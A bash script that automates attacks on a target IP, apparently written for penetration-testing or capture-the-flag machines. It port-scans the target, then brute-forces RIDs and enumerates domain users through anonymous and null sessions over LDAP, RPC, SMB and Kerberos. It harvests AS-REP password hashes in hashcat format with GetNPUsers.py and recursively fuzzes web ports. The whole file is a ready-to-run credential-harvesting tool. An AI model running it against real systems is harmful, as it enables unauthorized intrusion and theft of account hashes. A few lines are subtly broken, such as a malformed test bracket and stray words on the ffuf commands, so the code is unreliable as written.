#!/bin/bash

args=("$@")
currentDirectory=$(pwd)
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

if [ -z "${args[0]}" ]
then 
    echo "Enter IP"
    exit
fi


main() 
{
   # Define ANSI color variables
    RED='\033[1;31m'
    Green='\033[1;32m' 

    # Start script timer 
    start=$SECONDS

    ports=$(nmap -p- ${args[0]} -T4 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
    nmap -sC -sV -p$ports ${args[0]} -T4 -oN initial.txt &
    nmap -sU -sV --version-intensity 0 --max-retries 1 ${args[0]} -T4 -oN udpScan.txt &
    wait
    echo "$ports" >> openPorts.txt

    source /root/machine_recon_scanning/bin/activate
    smb=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openmicrosoft-ds/p" | wc -l)
    samba=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/Sambasmbd/p" | wc -l)
    msrpc=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openmsrpc/p" | wc -l)
    ldap=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openldap/p" | wc -l)
    kerberos=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openkerberos/p" | wc -l)
    httpPorts=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openhttp/p" | wc -l)
    httpsPorts=$(grep -i "ssl/http" initial.txt | wc -l)
    udpPorts=$(cat udpScan.txt | sed -r 's/\s+//g' | sed -n "/udpopen/p" | wc -l)

    udpFunc $udpPorts
    ldapFunc $ldap
    msrpcFunc $msrpc $ldap
    smbFunc $smb $samba $ldap
    wait
    kerberosFunc $kerberos
    httpFunc $httpPorts
    httpsFunc $httpsPorts
    deactivate
    wait
    echo -e ""
    echo -e ""
    echo -e "---------------------Finished Machine Recon------------------------"
    echo -e ""
    echo -e ""

            #End script timer
            end=$SECONDS
            duration=$(( end - start ))
            if [ ${duration} -gt 3600 ]; then
                    hours=$((duration / 3600))
                    minutes=$(((duration % 3600) / 60))
                    seconds=$(((duration % 3600) % 60))
                    printf "${RED}Completed in ${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\n"
            elif [ ${duration} -gt 60 ]; then
                    minutes=$(((duration % 3600) / 60))
                    seconds=$(((duration % 3600) % 60))
                    printf "${Green}Completed in ${minutes} minute(s) and ${seconds} second(s)\n"
            else
                    printf "${RED}Completed in ${duration} seconds\n"
            fi
            echo -e ""
    exit 0

}

udpFunc()
{
    if [ $1 -gt 0 ];
    then
        udpOpenPorts=$(cat udpScan.txt | sed -r 's/\s+//g' | sed -n "/udpopen/p" | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
        nmap -sC -sV -sU -p$udpOpenPorts ${args[0]} -oN udpScriptScan.txt &
    fi
}

ldapFunc()
{
    if [ $1 -gt 0 ];
    then
        ldapPort=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openldap/p" | cut -d "/" -f 1 | sed -n 1p)
        mkdir -p ldapResults
        ldapsearch -LLL -x -H ldap://${args[0]}:$ldapPort -b '' -s base '(objectclass=*)' | tee "$currentDirectory/ldapResults/ldapInitial.txt" | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //'
        namingContext=$(cat $currentDirectory/ldapResults/ldapInitial.txt | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //')
        ldapsearch -x -D "" -w "" -H ldap://${args[0]}:$ldapPort -b "$namingContext" -s sub "(objectclass=*)" 2>&1 | tee "$currentDirectory/ldapResults/ldapSearchInfo.txt"
    fi
}

msrpcFunc()
{
    if [ $1 -gt 0 ];
    then
        rpcPort=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openmsrpc/p" | cut -d "/" -f 1 | sed -n 1p)
        mkdir -p msrpcResults
        rpcclient -U "" -N ${args[0]} -c enumdomusers --port $rpcPort | tee "$currentDirectory/msrpcResults/enumDomUsers.txt"
        msrpcAccess=$(sed -n 1p msrpcResults/enumDomUsers.txt | sed 's/.* //')
        if [[ $msrpcAccess != "NT_STATUS_ACCESS_DENIED" ]];
        then 
            cat msrpcResults/enumDomUsers.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}' | tee "$currentDirectory/msrpcResults/domainUsers.txt"
            if [$2 -gt 0];
            then
                domainName=$(cat $currentDirectory/ldapResults/ldapInitial.txt | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //' | sed 's/DC=//g' | sed 's/,/./g')
                GetNPUsers.py $domainName/ -usersfile "$currentDirectory/msrpcResults/domainUsers.txt" -dc-ip ${args[0]} -format hashcat -outputfile "$currentDirectory/msrpcResults/asRepHashes.txt" | grep -F -e '[+]' -e '[-]'
            fi
        fi    
    fi
}

smbFunc()
{
    if [ $1 -gt 0 ] || [ $2 -gt 0 ]; then
        smbPort=''
        mkdir -p smbResults
        mkdir -p smbResults/shares
        if [ $1 -gt 0 ]; then 
            smbPort=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openmicrosoft-ds/p" | cut -d "/" -f 1 | sed -n 1p)
        else 
            smbPort=$(cat initial.txt | sed -r 's/\s+//g' | grep -m 2 "Sambasmbd" | tail -n 1 | awk '{print $1}' | cut -d "/" -f 1)
        fi
        if [[ $3 -gt 0 ]]; then
            mkdir -p "$currentDirectory/smbResults"
            crackmapexec smb ${args[0]} --server-port $smbPort | tee "$currentDirectory/smbResults/WindowsOSVersion.txt"
            crackmapexec smb ${args[0]} -u 'anonymous' -p '' --server-port $smbPort --rid-brute 20000 | tee "$currentDirectory/smbResults/RidBruteAllAnonymous.txt"
            crackmapexec smb ${args[0]} -u '' -p '' --server-port $smbPort --rid-brute 20000 | tee "$currentDirectory/smbResults/RidBruteAllNull.txt"
            cat "$currentDirectory/smbResults/RidBruteAllAnonymous.txt" | grep '(SidTypeUser)' | awk -F'\\\\' '{print $NF}' | awk '{print $1}' | tee "$currentDirectory/smbResults/domainUsers.txt"
            if [[ -s "$currentDirectory/smbResults/domainUsers.txt" ]]; then
                domainName=$(sed -n '/defaultNamingContext:/Ip' "$currentDirectory/ldapResults/ldapInitial.txt" | sed 's/[^ ]* //' | sed 's/DC=//g' | sed 's/,/./g')
                GetNPUsers.py "$domainName/" -usersfile "$currentDirectory/smbResults/domainUsers.txt" -dc-ip ${args[0]} -format hashcat -outputfile "$currentDirectory/smbResults/asRepHashes.txt" | grep -F -e '[+]' -e '[-]'
            fi
        fi

        timeout 1m smbmap -r -H ${args[0]} -P $smbPort | tee "$currentDirectory/smbResults/smbMapNullSession.txt" &
        timeout 1m smbmap -r -H ${args[0]} -u invalid -P $smbPort | tee "$currentDirectory/smbResults/smbMapGuestSession.txt" &
        smbclient -U '%' -L \\\\${args[0]}\\ -p $smbPort -N | tee "$currentDirectory/smbResults/smbClientNullSession.txt"
        smbclient -U "guest"% -L \\\\${args[0]}\\ -p $smbPort | tee "$currentDirectory/smbResults/smbClientGuestSession.txt"
        enum4linux-ng.py -A -R 500 ${args[0]} | tee "$currentDirectory/smbResults/enum4LinuxNull.txt" | grep "Found user" | tee "$currentDirectory/smbResults/enumNullUsers.txt" &
        enum4linux-ng.py -u anonymous -p '' -A -R 500 ${args[0]} | tee "$currentDirectory/smbResults/enum4LinuxAnonymous.txt" | grep "Found user" | tee "$currentDirectory/smbResults/enumAnonymousUsers.txt" &

        shares=$(cat smbResults/smbClientNullSession.txt | sed -n "/Disk/p" | wc -l)
        for (( k=0; k<$shares; k++ ))   
        do 
            shareLine=$((k+1))
            shareName=$(cat smbResults/smbClientNullSession.txt | sed -n "/Disk/p" | sed -n $(echo $shareLine)p | sed 's/Disk.*//g' | sed 's/^[ \t]*//;s/[ \t]*$//')
            smbclient \\\\${args[0]}\\$shareName -p $smbPort -c dir -N | tee "$currentDirectory/smbResults/shares/DirectoryListing_$shareName.txt"
            smbAccess=$(cat "$currentDirectory/smbResults/shares/DirectoryListing_$shareName.txt" | sed 's/^[ \t]*//;s/[ \t]*$//')
            if [[ ! $smbAccess =~ "NT_STATUS_ACCESS_DENIED" ]]; then
                echo ""
            else 
                rm "$currentDirectory/smbResults/shares/DirectoryListing_$shareName.txt"
            fi
        done
    fi
}

kerberosFunc()
{
    if [ $1 -gt 0 ];
    then
        mkdir -p kerberosResults
        domainName=$(cat $currentDirectory/ldapResults/ldapInitial.txt | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //' | sed 's/DC=//g' | sed 's/,/./g')
        timeout 10m kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc ${args[0]} --domain $domainName -v | grep 'VALID USERNAME:' | awk '{print $NF}' | tee "$currentDirectory/kerberosResults/users.txt"
    fi
}


httpFunc()
{
    
    if [ $1 -gt 0 ];
    then
        mkdir -p httpResults
        for (( i=0; i<$1; i++ ))   
        do 
            httpLine=$((i+1))
            httpPort=$(cat initial.txt | sed -r 's/\s+//g' | sed -n "/openhttp/p" | cut -d "/" -f 1 | sed -n $(echo $httpLine)p)
            microsoftHTTPAPI=$(grep -i $httpPort/tcp initial.txt | sed -n "/Microsoft HTTPAPI/p" | wc -l)
            if [[ $microsoftHTTPAPI -eq 0 ]];
            then                
                ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .html,.php,.jsp,.js -u http://${args[0]}:$httpPort/FUZZ -v -mc 200,301,302 -recursion -recursion-depth 2 -recursion-strategy greedy and close | tee "$currentDirectory/httpResults/ffufRecursion$httpPort.txt" &
            fi
        done
    fi
}

httpsFunc()
{

    if [ $1 -gt 0 ];
    then
        mkdir -p httpsResults
        for (( j=0; j<$1; j++ ))   
        do 
            httpsLine=$((j+1))
            httpsPort=$(grep -i "ssl/http" initial.txt | cut -d "/" -f 1 | sed -n $(echo $httpsLine)p)
            microsoftHttpsHTTPAPI=$(grep -i $httpsPort/tcp initial.txt | sed -n "/Microsoft HTTPAPI/p" | wc -l)
            if [[ $microsoftHttpsHTTPAPI -eq 0 ]];
            then                
                ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .html,.php,.jsp,.js -u https://${args[0]}:$httpsPort/FUZZ -v -mc 200,301,302 -recursion -recursion-depth 2 -recursion-strategy greedy and close | tee "$currentDirectory/httpsResults/ffufRecursion$httpsPort.txt" &
            fi
        done
    fi
}

main
